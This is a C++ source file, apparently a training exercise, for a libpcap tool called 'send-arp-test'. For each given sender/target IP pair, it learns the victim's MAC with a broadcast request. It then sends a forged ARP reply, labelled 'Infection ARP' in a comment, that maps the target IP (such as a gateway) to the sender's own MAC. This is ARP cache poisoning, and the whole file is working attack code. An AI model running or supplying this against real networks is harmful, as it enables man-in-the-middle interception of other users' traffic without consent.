#include "main.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface> <sendIP> <targetIP> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	if (argc < 2 || argc % 2 != 0) {
		usage();
		return EXIT_FAILURE;
	}
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

	unsigned char selfMac[6];
	GetSelfMacFromInterface(dev, selfMac);

	for (int i=2; i < argc; i+=2) {
		char* sendIP = argv[i];
		char* targetIP = argv[i+1];


		EthArpPacket packet;

		packet.eth_.type_ = htons(EthHdr::Arp);
		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;

		//Broadcast
		SetPacket(packet, Mac("FF:FF:FF:FF:FF:FF"), selfMac, ArpHdr::Request,sendIP, Mac("00:00:00:00:00:00"), targetIP);
		SendPacket(pcap, packet);

		//Infection ARP
		Mac smac = GetSourceMac(pcap);
		SetPacket(packet, smac, selfMac, ArpHdr::Reply, sendIP, smac, targetIP);
		SendPacket(pcap, packet);

	}

	pcap_close(pcap);
	

}

void SetPacket(struct EthArpPacket &packet, Mac dmac, unsigned char smac[6], uint16_t op, char* sip, Mac tmac, char* tip){
	packet.eth_.dmac_ = dmac;
	packet.eth_.smac_ = smac;
	packet.arp_.op_ = htons(op);
	packet.arp_.smac_ = smac;
    packet.arp_.sip_ = htonl(Ip(tip));
    packet.arp_.tmac_ = tmac;
    packet.arp_.tip_ = htonl(Ip(sip));
}

Mac GetSourceMac(pcap_t* pcap) {
	struct pcap_pkthdr* header;
	const u_char* packet;

    pcap_next_ex(pcap, &header, &packet);

	struct EthArpPacket *etharp = (struct EthArpPacket *)packet;
	Mac smac = etharp->arp_.smac();

	return smac;
}

int GetSelfMacFromInterface(const char *interface, unsigned char* mac_addr) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    
    strcpy(ifr.ifr_name, interface);
    ioctl(sock, SIOCGIFHWADDR, &ifr);
    memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, 6);
    
    close(sock);
    return 0;
}

void SendPacket(pcap_t* pcap, struct EthArpPacket packet) {
	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		exit(PCAP_ERROR);
	}
}
